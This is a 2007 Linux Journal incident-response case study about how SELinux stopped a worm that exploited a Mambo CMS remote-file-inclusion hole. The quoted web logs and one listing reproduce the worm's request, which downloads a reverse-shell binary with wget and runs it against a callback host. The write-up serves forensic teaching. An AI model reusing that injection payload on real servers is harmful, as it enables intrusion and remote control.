@@ -1,0 +1,609 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><head><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"><title>
+Mambo Exploit Blocked by SELinux
+</title><link rel="stylesheet" href="../css/archive.css" type="text/css"><meta name="generator" content="DocBook XSL Stylesheets V1.57.0"><meta name="description" content="&#10;A real-world case where SELinux proved its worth.&#10;"><link rel="stylesheet" href="../../css/archive.css" type="text/css"><script type="text/javascript" src="../../js/archive.js"></script><script type="text/javascript" src="../../js/highlight.js"></script></head><body onload="search_highlight();">
+  <div class="headerdiv">
+    <a href="../../index.html">
+      <img class="topimg" src="../../images/CD_HeaderBanner.png" alt="LJ Archive"/>
+    </a>
+  </div>
+  
+  <div class="tophrdiv">
+  </div>
+  
+  <div id="top_search">
+  <table class="page_search" summary="">
+    <tr>
+      <td valign="top" align="left">
+        <p class="small_shutdown"><a href="/.exit">Shutdown Archive web server</a></p>
+      </td>
+      <td valign="top" align="right">
+        <form method="get" action="/zoom/search.cgi">
+          <input type="hidden" name="zoom_sort" value="0" />
+          <input type="hidden" name="zoom_xml" value="0" />
+          <input type="hidden" name="zoom_per_page" value="10" />
+          <input type="hidden" name="zoom_and" value="1" />
+          Search: <input type="text" name="zoom_query" size="20" value="" class="zoom_searchbox" />
+          <input type="submit" value="Submit" />
+        </form>
+      </td>
+    </tr>
+  </table>
+  </div>
+  <div class="article" lang="en"><div class="titlepage"><div><h1 class="title"><a name="N0xf86580.0x107dab0"></a>
+Mambo Exploit Blocked by SELinux
+</h1></div><div><div class="author"><h3 class="author">
+Richard
+ 
+Bullington-McGuire
+</h3></div><div class="issuemoyr">Issue #159, July 2007</div></div><div><p>
+A real-world case where SELinux proved its worth.
+</p></div></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107e298"></a></h2></div></div><p>
+If you operate Internet-connected servers, chances are you 
+eventually will have to deal with a successful attack. Last year,
+I discovered that despite the multilayered defenses in place on a test
+Web server (targetbox), an attacker had managed to use an exploit in a
+partially successful attempt to gain access. This server was running
+Red Hat Enterprise Linux 4 (RHEL 4) and the Mambo content management
+system. It had multiple defenses in place, including Security-Enhanced
+Linux (SELinux). SELinux prevented the attacker from executing the second
+stage of the attack, possibly preventing a root compromise.
+</p><p>
+This article presents a case study of the intrusion response,
+explaining how I discovered the intrusion, what steps I took to identify
+the exploit, how I recovered from the attack and what lessons I learned
+regarding system security. I've changed machine names and IP addresses
+for privacy reasons.
+</p><p>
+Computers involved in the attack:
+</p><div class="itemizedlist"><ul type="disc"><li><p>
+targetbox: 192.168.166.155&mdash;our server, running RHEL 4 and Mambo.
+</p></li><li><p>
+wormhole: 10.9.233.25&mdash;worm attack source.
+</p></li><li><p>
+zombieweb: 172.16.31.57&mdash;Web server hosting attack payload.
+</p></li><li><p>
+cbackbox: 10.200.238.39&mdash;target of stage 2 worm executable.
+</p></li></ul></div></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107e818"></a>
+Defending Your System from Attack</h2></div></div><p>
+Today, prudent system administrators defend their machines with a layered
+security approach, using firewalls, automated patch management systems, log
+analysis tools and, recently, SELinux. SELinux
+provides additional access controls beyond those traditionally provided in
+the UNIX security model. Recent Red Hat Enterprise Linux and Fedora Core
+releases have an SELinux policy implementation called the targeted
+policy. It aims to restrict the privileges of programs in multiple
+packages to the minimum that they require for correct operation. This
+can blunt an attack that depends on having read, write or execute access
+to certain files or directories.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107e978"></a>
+Discovering the Incident</h2></div></div><p>
+At approximately 8:00 AM on Saturday, May 6, 2006, I was auditing the
+logs on targetbox when I noticed an odd SELinux enforcement message
+in /var/log/messages:
+
+
+<pre     class="programlisting">
+May  4 07:52:27 targetbox kernel: audit(1146743547.060:2277): 
+avc:  denied  { execute_no_trans } for  pid=9401 comm="sh" 
+name="cback" dev=dm-0 ino=852100 
+scontext=user_u:system_r:httpd_sys_script_t 
+tcontext=user_u:object_r:httpd_sys_script_rw_t tclass=file
+</pre>
+</p><p>
+I used locate to try to identify cback quickly:
+
+<pre     class="programlisting">
+# locate cback
+/tmp/cback
+/usr/share/pixmaps/gnome-ccbackground.png
+/usr/lib/libartscbackend.la
+/usr/lib/libartscbackend.so.0.0.0
+/usr/lib/libartscbackend.so.0
+</pre>
+</p><p>
+The file command revealed the executable file type of cback:
+
+<pre     class="programlisting">
+# file /tmp/cback
+/tmp/cback: ELF 32-bit LSB executable, Intel 80386, 
+version 1 (SYSV), for GNU/Linux 2.2.0, dynamically 
+linked (uses shared libs), not stripped
+</pre>
+</p><p>
+The user apache owned that file, but it had a date a few months before
+the initial operating system installation on targetbox:
+
+<pre     class="programlisting">
+# ls -i /tmp/cback
+852100 /tmp/cback
+[root@targetbox ~]# ls -lZ /tmp/cback
+-rwxr--r--  apache   apache   
+user_u:object_r:httpd_sys_script_rw_t /tmp/cback
+[root@targetbox ~]# ls -lai /tmp/cback 
+852100 -rwxr--r--  1 apache apache 13901 
+Feb 15  2005 /tmp/cback
+</pre>
+</p><p>
+This confirmed the identity of cback as the file in the audit message,
+because it had the inode number 852100.
+</p><p>
+If locate had not found the file, I could have used find to try to
+identify the file by inode:
+
+<pre     class="programlisting">
+# find / -inum 852100 2&gt;/dev/null
+/tmp/cback
+</pre>
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107ee48"></a>
+Analyzing the Executable for Clues</h2></div></div><p>
+Given the name of the script, maybe it was intended as a callback program.
+Because the apache user owned the file, I checked the Web server log files
+for evidence.
+</p><p>
+Because the attack program was in /tmp, I saved a copy of it for posterity:
+
+<pre     class="programlisting">
+# cp -a cback /root
+</pre>
+</p><p>
+The attack program seemed to do something with sockets, judging from
+the strings within (Listing 1).
+
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107f0b0"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 1. Attack Payload Strings</b></p><pre     class="programlisting">
+
+# strings cback
+/lib/ld-linux.so.2
+libc.so.6
+printf
+connect
+strerror
+execl
+dup2
+sleep
+socket
+inet_addr
+wait
+fork
+htons
+__errno_location
+exit
+atoi
+_IO_stdin_used
+__libc_start_main
+close
+__gmon_start__
+GLIBC_2.0
+PTRh
+[^_]
+%s &lt;host&gt; &lt;port&gt;
+cannot create socket, retrying in 5 seconds
+socket ok
+error: %s
+retting in 5 seconds
+/bin/sh
+fork error, retry in 5 seconds
+
+</pre></div><p>
+The Web server log file had many suspicious requests, some attacking Mambo
+using command injection and wget, some attacking other CMS systems. I
+copied all the lines containing php or wget using grep and put them in
+/root/exploit.log. Listing 2 contains a trace of the most recent attempt.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107f318"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 2. Attack Traces in Web Server Access Log</b></p><pre     class="programlisting">
+# grep 10.9.233.25 /root/exploit.log
+/var/log/httpd/access_log:10.9.233.25 - - 
+[04/May/2006:07:52:21 -0400]
+"GET
+/index2.php?option=com_content&amp;do_pdf=1&amp;id=1index2.php
+&#8618;?_REQUEST[option]=com_content&amp;_REQUEST[Itemid]
+&#8618;=1&amp;GLOBALS=&amp;mosConfig_absolute_path=
+&#8618;http://172.16.31.57/cmd.gif?&amp;cmd=cd%20/tmp;
+&#8618;wget%20172.16.31.57/cback;chmod%20744%20cback;
+&#8618;./cback%2010.200.238.39%208080;echo%20YYY;echo|
+HTTP/1.1" 200 594 "-" "Mozilla/4.0 (compatible; MSIE 6.0; 
+Windows NT 5.1;)"
+/var/log/httpd/access_log:10.9.233.25 - - 
+[04/May/2006:07:52:24 -0400]
+"GET
+/mambo/index2.php?_REQUEST[option]=com_content&amp;_REQUEST
+&#8618;[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=
+&#8618;http://172.16.31.57/cmd.gif?&amp;cmd=cd%20/tmp;
+&#8618;wget%20172.16.31.57/cback;chmod%20744%20cback;
+&#8618;./cback%2010.200.238.39%208080;echo%20YYY;echo|
+HTTP/1.1" 404 294 "-" "Mozilla/4.0 (compatible; MSIE 6.0; 
+Windows NT 5.1;)"
+/var/log/httpd/access_log:10.9.233.25 - - 
+[04/May/2006:07:52:25 -0400]
+"GET
+/cvs/index2.php?_REQUEST[option]=com_content&amp;_REQUEST
+&#8618;[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=
+&#8618;http://172.16.31.57/cmd.gif?&amp;cmd=cd%20/tmp;
+&#8618;wget%20172.16.31.57/cback;chmod%20744%20cback;
+&#8618;./cback%2010.200.238.39%208080;echo%20YYY;echo|
+HTTP/1.1" 404 292 "-" "Mozilla/4.0 (compatible; MSIE 6.0; 
+Windows NT 5.1;)"
+/var/log/httpd/access_log:10.9.233.25 - - 
+[04/May/2006:07:52:27 -0400]
+"POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 
+(compatible; MSIE 6.0; Windows NT 5.1;)"
+</pre></div><p>
+The log file did contain two very useful clues; it confirmed that
+the cback binary was related to a request made to Mambo. Furthermore,
+the query string confirmed that the attacker used wget, a command-line
+URL-fetching tool, to retrieve the exploit from a remote server. The
+Web server request attempted to execute the cback executable with an
+IP address parameter of 10.200.238.39, presumably another machine under
+the control of the attacker.
+</p><p>
+The attack attempted to execute this sequence of shell commands:
+
+<pre     class="programlisting">
+cd /tmp
+wget 172.16.31.57/cback
+chmod 744 cback
+./cback 10.200.238.39 8080
+echo YYY
+echo| HTTP/1.1
+</pre>
+</p><p>
+Going back to /var/log/messages, I searched for further suspicious
+SELinux enforcement messages. Listing 3 contains the lines that matched
+the times of the Web server attacks.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107f688"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 3. SELinux Audit Messages</b></p><pre     class="programlisting">
+May  4 07:52:24 targetbox kernel: 
+audit(1146743544.910:2275): avc:
+denied  { ioctl } for  pid=9399 comm="wget" 
+name="error_log" dev=dm-0
+ino=1624085 scontext=user_u:system_r:httpd_sys_script_t
+tcontext=root:object_r:httpd_log_t tclass=file 
+May  4 07:52:24 targetbox
+kernel: audit(1146743544.911:2276): 
+avc:  denied  { ioctl } for  pid=9399
+comm="wget" name="error_log" dev=dm-0 ino=1624085 
+scontext=user_u:system_r:httpd_sys_script_t 
+tcontext=root:object_r:httpd_log_t
+tclass=file
+May  4 07:52:27 targetbox kernel: audit(1146743547.060:2277): 
+avc: denied  { execute_no_trans } for  pid=9401 comm="sh" 
+name="cback" dev=dm-0 ino=852100 
+scontext=user_u:system_r:httpd_sys_script_t
+tcontext=user_u:object_r:httpd_sys_script_rw
+_t tclass=file
+</pre></div><p>
+This appeared to be a worm, because www.pkrinternet.com (on a different
+machine, but the same subnet) also had requests from 10.9.233.25 at
+around the same time, as Listing 4 shows.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107f8f0"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 4. Verification of Worm Activity on Nearby Server</b></p><pre     class="programlisting">
+$ grep 10.9.233.25 \
+/var/log/httpd/www.pkrinternet.com-access_log
+10.9.233.25 - - [04/May/2006:07:52:21 -0400] 
+"GET
+/index2.php?option=com_content&amp;do_pdf=1&amp;id=
+&#8618;1index2.php?_REQUEST[option]=com_content&amp;_REQUEST
+&#8618;[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=
+&#8618;http://172.16.31.57/cmd.gif?&amp;cmd=cd%20/tmp;
+&#8618;wget%20172.16.31.57/cback;chmod%20744%20cback;
+&#8618;./cback%2010.200.238.39%208080;echo%20YYY;echo|
+HTTP/1.1" 404 290 "-" "Mozilla/4.0 (compatible; MSIE 6.0; 
+Windows NT 5.1;)"
+10.9.233.25 - - [04/May/2006:07:52:21 -0400] 
+"GET
+/index.php?option=com_content&amp;do_pdf=1&amp;id=1index2.php?_REQUEST
+&#8618;[option]=com_content&amp;_REQUEST[Itemid]=1&amp;GLOBALS=
+&#8618;&amp;mosConfig_absolute_path=
+&#8618;http://172.16.31.57/cmd.gif?&amp;cmd=cd%20/tmp;
+&#8618;wget%20172.16.31.57/cback;chmod%20744%20cback;
+&#8618;./cback%2010.200.238.39%208080;echo%20YYY;echo|
+HTTP/1.1" 404 289 "-" "Mozilla/4.0 (compatible; MSIE 6.0; 
+Windows NT 5.1;)"
+[ ...output trimmed ]
+</pre></div><p>
+Lines showing further attacks similar to the trace on stockpot versus
+Mambo, xmlrpc.php, drupal and phpgroupware also appeared in this grep.
+</p><p>
+The worm made requests only to the default virtual host, so it's
+likely that the worm was not using the Host: virtual host header in its
+requests. This indicates that it was scanning IP subnets for vulnerable
+hosts, rather than working through a list of hostnames.
+</p><p>
+The modification time on the cback file was Feb 5, 2005. That was
+probably the modification time of the file on the remote system that
+wget retrieved. wget normally resets the modification time of files it
+downloads to match their original modification times. Listing 5 shows
+how to interrogate all the timestamps on a file.
+
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x107fc60"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 5. Investigating File Timestamps</b></p><pre     class="programlisting">
+$ for x in atime access status use; do
+&gt;   echo -n "$x "
+&gt;   ls -l --time=$x /tmp/cback
+&gt; done
+[rbulling@targetbox ~]$ for x in atime access status use mtime; do
+&gt;  echo -n "$x " ; ls -l --time=$x /tmp/cback
+&gt; done
+atime -rwxr--r--  1 apache apache 13901 May  6 11:33 /tmp/cback
+access -rwxr--r--  1 apache apache 13901 May  6 11:33 /tmp/cback
+status -rwxr--r--  1 apache apache 13901 May  4 07:52 /tmp/cback
+use -rwxr--r--  1 apache apache 13901 May  6 11:33 /tmp/cback
+</pre></div><p>
+The cback binary probably was created at 07:52 AM on May 4, corresponding
+to the wget command injection attack. That was the last time the
+file attributes were modified. Although UNIX does not allow you to retrieve
+the true creation time of a file, the status time often can stand in
+for that. The other times correspond to the times of my own initial
+investigations of the cback file. If I had been more careful, I could have
+done this ls command before reading the cback file at all, so that the
+atime, access and use times would have been those the attacker had set.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076758"></a>
+What Hit Me?</h2></div></div><p>
+Because this looked like a worm attacking Mambo, a search on &ldquo;mambo
+worm&rdquo;
+on Google found references to the attack, including articles from
+<span   class="emphasis"><em>ComputerWorld</em></span>, <span   class="emphasis"><em>Outpost24</em></span>,
+F-Secure and Bugtraq (see Resources).
+</p><p>
+The Mitre Common Vulnerabilities and Exposures Project provides a
+dictionary of known vulnerabilities. It has a brief abstract of the
+characteristics of the vulnerability with references to security mailing
+lists and Web sites that confirm the problems. Searching for
+&ldquo;mambo&rdquo;
+on <a href="http://www.cvw.mitre.org" target="_self">www.cvw.mitre.org</a> yielded a couple-dozen known
+vulnerabilities&mdash;one
+of which (CVS-2005-3738) relates to mosConfig_absolute_path, one of the
+seriously mangled variables in the request URL.
+</p><p>
+After reading up on recent malware activity surrounding Mambo, I
+saw that the attack vector probably was closely related to the
+Net-Worm.Linux.Mare.d worm strain described in the news reports and
+vulnerability databases. However, some of the names of executables in
+the attack that hit targetbox were slightly different from the attack
+executables named in the vulnerability reports.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076ac8"></a>
+Safety Precautions and Forensic Evidence</h2></div></div><p>
+To run these security analysis tools in the safest way possible, you need
+to disconnect the computer in question from all networks and boot from
+known good media before attempting to analyze the intrusion. That way,
+any remaining attack programs will not be able to attack other machines
+on your network, and intruders will not interrupt your investigation
+by interacting with the machine. You won't be able to use the system
+while you analyze the intrusion, and it may take time to put together
+an analysis toolkit that will work on a rescue disk. Although this takes
+more time and preparation than running the analysis tools on a running
+system that might be compromised, it gives a higher level of assurance
+that a compromise will not spread to other machines on your network.
+</p><p>
+Making a backup copy of the entire disk to a removable drive also
+is a good idea. You could use a command such as this to do the job:
+
+<pre     class="programlisting">
+# dd if=/dev/hda1 of=/mnt/removable-drive/disk.img bs=512k
+</pre>
+</p><p>
+You then can mount and analyze the backup using the loop device (see
+&ldquo;Disk Images under Linux&rdquo; in the Resources section). It's probably faster
+and easier to analyze the original system, but it's nice to have this
+backup for forensic purposes.
+</p><p>
+In an ideal world, you could do this the moment you realize an attack
+has succeeded. However, sometimes you have to assess the severity of
+the compromise and balance that against the time and resources you
+have available.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076d88"></a>
+Figuring Out the Damage Done</h2></div></div><p>
+It looks like whoever broke in could have read or written to any file
+available to the apache user. This would include the PHP configuration
+file for Mambo that had a MySQL database user name and password in it. I
+changed that password just to be sure that the intruder could not use
+it to attempt further privilege escalation.
+</p><p>
+Fortunately for me, this was only a test installation, so to prevent
+future exploits, I removed the Mambo installation completely. I also could
+have attempted to upgrade the software to remove the vulnerability.
+</p><p>
+When a user account is compromised, you need to face the danger that
+the attacker could gain access to the superuser (root) account. If
+an attacker gets root, it can make it much more difficult to recover from an
+attack. Most of the time, you need to re-install the operating system
+from known good media and carefully and selectively audit and restore
+software configurations. Attackers who manage to get root access often
+install a rootkit&mdash;software that hides itself from casual inspection and
+offers a remote control back door or other malicious features. Fortunately,
+a program called chkrootkit (from <a href="http://chkrootkit.org" target="_self">chkrootkit.org</a>) can help scan for active
+rootkits. Listing 6 shows the output of chkrootkit in quiet mode on
+targetbox.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1076f98"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 6. chkrootkit Output</b></p><pre     class="programlisting">
+# chkrootkit -q
+/usr/lib/firefox-1.0.4/chrome/.reregchrome
+/usr/lib/firefox-1.0.6/chrome/.reregchrome
+/usr/lib/jvm/java-1.4.2-ibm-1.4.2.3/jre/.systemPrefs
+/usr/lib/jvm/java-1.4.2-ibm-1.4.2.3/jre/.systemPrefs/
+&#8618;.system.lock
+/usr/lib/jvm/java-1.4.2-ibm-1.4.2.3/jre/.systemPrefs/
+&#8618;.systemRootModFile
+/usr/lib/firefox-1.0.8/chrome/.reregchrome
+/usr/lib/firefox-1.0.7/chrome/.reregchrome
+/usr/lib/perl5/5.8.5/i386-linux-thread-multi/.packlist
+/usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/
+&#8618;auto/mod_perl/.packlist
+/usr/lib/jvm/java-1.4.2-ibm-1.4.2.3/jre/.systemPrefs
+INFECTED (PORTS:  465)
+</pre></div><p>
+The chkrootkit program checks for and analyzes various files that rootkits and worms commonly leave behind. It warns about hidden files in
+unexpected places and services running on ports that malware often
+uses. A quick inspection revealed that the hidden files this listed
+were all harmless. The INFECTED warning on port 465 was a false alarm,
+because this computer was running a Web server that listens for https on
+port 465. In this case, analyzing the chkrootkit output did not reveal
+a real rootkit problem. Running chkrootkit can give you some extra
+peace of mind when you know an attacker has penetrated your defenses,
+even though its checks are not conclusive.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1077258"></a>
+The Good News</h2></div></div><p>
+The server ran SELinux using the targeted policy at the time of the
+attack. The audit log message that originally sounded the alarm that
+all was not well was an access denied message. The Web server error log
+provided more detail in the form of the output of the injected shell code,
+including the wget session and the access denied message resulting
+from the attempted execution of wget, as shown in Listing 7.
+
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x10773b8"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Listing 7. Web Server Error Logs Showing Attack Traces</b></p><pre     class="programlisting">
+[Thu May 04 07:52:24 2006] [error] [client 10.9.233.25] 
+File does not exist: /var/www/html/mambo
+[client 10.9.233.25] PHP Warning:
+main(http://ess.trix.net/therules.dat): 
+failed to open stream: HTTP
+request failed! HTTP/1.1 404 Not Found\r\n in
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php on line 13
+[client 10.9.233.25] PHP Warning:  main(): Failed opening
+'http://ess.trix.net/therules.dat' for inclusion
+(include_path='.:/usr/share/pear') in
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php on line 13
+[client 10.9.233.25] PHP Notice:  Undefined variable:  pro4 in
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php on line 69
+[ ...output trimmed ]
+[client 10.9.233.25] PHP Notice:  Undefined variable:  
+SERVER_SOFTWARE in 
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php on line 112
+[client 10.9.233.25] PHP Notice:  Undefined variable:  
+SERVER_VERSION in
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php on line 112
+--07:52:24--  http://172.16.31.57/cback
+           =&gt; `cback'
+Connecting to 172.16.31.57:80... connected.
+HTTP request sent, awaiting response... [Thu May 04 07:52:25 2006]
+[error] [client 10.9.233.25] File does not exist: /var/www/html/cvs
+200 OK
+Length: 13,901 (14K) [text/plain]
+
+    0K .......... ...                         100%  110.90
+KB/s
+
+07:52:27 (110.90 KB/s) - `cback' saved [13901/13901]
+
+sh: ./cback: Permission denied
+[client 10.9.233.25] PHP Notice:  Undefined variable:  ch_msg in
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php on line 202
+[ ...output trimmed...]
+[client 10.9.233.25] PHP Fatal error:  Cannot redeclare safemode()
+(previously declared in
+http://172.16.31.57/cmd.gif?/includes/HTML_toolbar.php:129) in
+http://172.16.31.57/cmd.gif?/includes/footer.php on line 129
+</pre></div><p>
+SELinux prevented the cback executable from running, saving targetbox
+from the next stage of the worm.
+</p><p>
+Newer versions of Mambo close the hole that the attacker exploited, so I
+could install a new version without being vulnerable to the same exploit.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x1077678"></a>
+Lessons Learned</h2></div></div><p>
+Many of the tools required to analyze an attack are already a core part
+of all modern Linux distributions. Combined with the power of modern
+search engines and the public disclosure of known vulnerabilities, you can
+often determine a good deal of information about the nature of an attack.
+</p><p>
+Installing something from source code to test it out, then leaving it
+on a publicly available computer made the system vulnerable.
+That this test installation lived in the document root of the main
+virtual host on the Web server made it even more exposed and vulnerable
+to discovery by worms.
+</p><p>
+Many PHP-powered systems have installation instructions that essentially
+tell you to unarchive the software somewhere inside the document root of a
+Web server, then modify some configuration files. You often cannot use
+the same type of clean operating-system-wide packaging for PHP systems,
+as each installation uses a distinct set of PHP templates. It took
+about 11 months between installing Mambo and the attack, during which
+time I did not update the software at all.
+</p><p>
+Using yum or apt-get to update Mambo would help keep
+it up to date. When I started investigating Mambo, I could not find
+RPM packaging for it, though third parties have created RPMs for Mambo
+since then. Operating system vendors and software authors need to work
+on better mechanisms for automatic software maintenance of Web systems.
+</p><p>
+SELinux really saved the day, preventing the exploit program from
+running. Without the protection of SELinux, this easily could have
+turned into a root compromise requiring a much more extensive analysis
+and recovery effort.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0xf86580.0x10778e0"></a></h2></div></div><div class="sidebar"><p class="title"><b>
+Resources</b></p><p>
+SELinux: <a href="http://www.nsa.gov/selinux" target="_self">www.nsa.gov/selinux</a>
+</p><p>
+Mambo: <a href="http://www.mamboserver.com" target="_self">www.mamboserver.com</a>
+</p><p>
+Red Hat SELinux Guide: <a href="http://www.redhat.com/docs/manuals/enterprise/RHEL-4-Manual/selinux-guide" target="_self">www.redhat.com/docs/manuals/enterprise/RHEL-4-Manual/selinux-guide</a>
+</p><p>
+<span   class="emphasis"><em>ComputerWorld</em></span> Article on the Mambo Worm:
+<a href="http://www.computerworld.com/securitytopics/security/story/0,10801,108868,00.html?source=x73" target="_self">www.computerworld.com/securitytopics/security/story/0,10801,108868,00.html?source=x73</a>
+</p><p>
+<span   class="emphasis"><em>Outpost24</em></span> Article on the Mambo Worm:
+<a href="http://www.outpost24.com/ops/delta/FrameIndex.jsp?page=/ops/delta/news/News.jsp%3FXID%3D1157%26XVCLANGUAGEID%3D" target="_self">www.outpost24.com/ops/delta/FrameIndex.jsp?page=/ops/delta/news/News.jsp%3FXID%3D1157%26XVCLANGUAGEID%3D</a>
+</p><p>
+F-Secure Worm Report: <a href="http://www.f-secure.com/v-descs/mare_d.shtml" target="_self">www.f-secure.com/v-descs/mare_d.shtml</a>
+</p><p>
+Bugtraq on Mambo Vulnerabilities:
+<a href="http://archives.neohapsis.com/archives/bugtraq/2006-02/0463.html" target="_self">archives.neohapsis.com/archives/bugtraq/2006-02/0463.html</a>
+</p><p>
+Common Vulnerabilities and Exposures Dictionary:
+<a href="http://www.cve.mitre.org" target="_self">www.cve.mitre.org</a>
+</p><p>
+Common Vulnerabilities and Exposures Mambo Issue:
+<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3738" target="_self">www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3738</a>
+</p><p>
+&ldquo;Disk Images under Linux&rdquo;: <a href="http://www.mega-tokyo.com/osfaq/Disk%20Images%20Under%20Linux" target="_self">www.mega-tokyo.com/osfaq/Disk%20Images%20Under%20Linux</a>
+</p><p>
+Mambo RPM Packages:
+<a href="http://dag.wieers.com/packages/mambo" target="_self">dag.wieers.com/packages/mambo</a>
+</p></div></div></div>
+<div class="authorblurb"><p>
+Richard Bullington-McGuire is the Managing Partner of PKR Internet,
+LLC, a software and systems consulting firm in Arlington, Virginia,
+specializing in Linux, open source and Java. He also founded The
+Obscure
+Organization, a nonprofit organization that promotes creativity and
+community through technology. He has been a Linux sysadmin since 1994.
+You can reach him at <a href="mailto:rbulling@pkrinternet.com">rbulling@pkrinternet.com</a>.
+</p></div>
+
+  <div class="toclinks">
+    <a class="link1" href="../tocindex.html">Archive Index</a>
+    <a class="link2" href="../159/toc159.html">Issue Table of Contents</a>
+  </div>
+  <div class="bottomhrdiv">
+  </div>
+  
+  <div id="bottom_search">
+  <table class="page_search" summary="">
+    <tr>
+      <td valign="top" align="left">
+        <p class="small_shutdown"><a href="/.exit">Shutdown Archive web server</a></p>
+      </td>
+      <td valign="top" align="right">
+        <form method="get" action="/zoom/search.cgi">
+          <input type="hidden" name="zoom_sort" value="0" />
+          <input type="hidden" name="zoom_xml" value="0" />
+          <input type="hidden" name="zoom_per_page" value="10" />
+          <input type="hidden" name="zoom_and" value="1" />
+          Search: <input type="text" name="zoom_query" size="20" value="" class="zoom_searchbox" />
+          <input type="submit" value="Submit" />
+        </form>
+      </td>
+    </tr>
+  </table>
+  </div>
+  
+  <div class="footerdiv">
+    <a href="../../index.html">
+      <img class="bottomimg" src="../../images/CD_FooterBanner.png" alt="LJ Archive"/>
+    </a>
+  </div>
+  
+  <div class="copyright">
+    Copyright &copy; 1994 - 2018 <cite>Linux Journal</cite>.  All rights reserved.
+  </div>
+  </body></html>
